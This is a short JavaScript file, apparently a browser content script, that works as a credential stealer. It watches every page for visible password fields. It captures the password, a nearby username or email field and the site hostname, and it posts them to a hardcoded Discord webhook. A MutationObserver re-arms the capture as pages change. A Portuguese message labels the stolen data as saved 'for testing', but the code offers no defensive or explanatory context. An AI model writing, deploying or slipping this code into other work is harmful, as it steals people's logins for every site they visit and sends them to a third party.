const WEBHOOK_URL = 'https://discord.com/api/webhooks/1504092453505073162/NlZHsVqlDhLs8QHcpAqGyzZcARQmutUAB_MgaaRtfp71-sl_oDcwX13Kbc0P8TRt3Zin';


function tryCapture() {
  const passwordFields = Array.from(document.querySelectorAll('input[type="password"]'));

  const passwordField = passwordFields.find(input => {
    const rect = input.getBoundingClientRect();

    return (
      input.value &&
      input.value.trim().length > 0 &&
      rect.width > 0 &&
      rect.height > 0 &&
      !input.disabled &&
      !input.readOnly
    );
  }) || passwordFields.find(input => {
    const rect = input.getBoundingClientRect();

    return (
      rect.width > 0 &&
      rect.height > 0 &&
      !input.disabled &&
      !input.readOnly
    );
  });

  if (!passwordField) return;

  passwordField.addEventListener('change', () => {
    const usernameField = document.querySelector('input[type="email"], input[type="text"]');

    if (passwordField.value) {
      const data = {
          url: window.location.hostname,
          username: usernameField?.value || '(não encontrado)',
          password: passwordField.value
        };

        const { url, username, password } = data;

    fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `🔐 **Nova credencial salva para teste!**\n🌐 Site: ${url}\n👤 Usuário: ${username}\n🔑 Senha: ${password}`
      })
    });
    }
  });
}


tryCapture();

const observer = new MutationObserver(tryCapture);

if (document.body) {
  observer.observe(document.body, { childList: true, subtree: true });
}
